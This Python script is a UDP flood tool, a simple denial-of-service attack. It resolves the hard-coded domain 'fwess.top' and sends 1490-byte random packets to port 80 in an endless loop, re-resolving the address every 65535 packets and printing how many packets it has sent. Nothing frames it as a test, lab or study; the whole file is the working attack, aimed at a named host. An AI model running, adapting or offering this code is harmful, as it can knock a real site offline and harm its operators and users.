
# Import.
from datetime import timedelta
from   platform import system
from   tqdm.auto import tqdm
import os
import time
import random
import socket
import pyfiglet
import datetime



# Platform info
#uname=system()

#if uname == "Windows":
#    cmd_clear_clear = 'cls'
#else:
#    cmd_clear = 'clear'

#os.system(cmd_clear)


# Socket
sock  = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)



# Get ip.
url = "fwess.top"
ip = socket.gethostbyname(url)


# Value.
sent = 0
i = 590
timeR = i + random.randint(0,20)
now = datetime.datetime.now()
dtime = now.strftime("%Y-%m-%d %H:%M:%S")

# Port selection.
port_mode = False # If 'False' all ports will be use, if 'True' - certain.
#port = 1
port = 80

#ululu alala
if port_mode == False:  # All ports.
    try:
        while True:
            if sent == 65535:                
                sent = 1
                ip = socket.gethostbyname(url)

            elif port == 1900:
                port = 1901

            
            sock.sendto(bytes, (str(ip), port))
            sent += 1
            #port += 1
            timeR = i + random.randint(0,20)
            now = datetime.datetime.now()
            dtime = now.strftime("%Y-%m-%d %H:%M:%S")
            print('\033[32;1m[%s]Sented %s packets to %s through port:1~%s\033[0m'%(dtime, sent, ip, port))       
    except:
        print('\n\033[31;1mExited\033[0m')
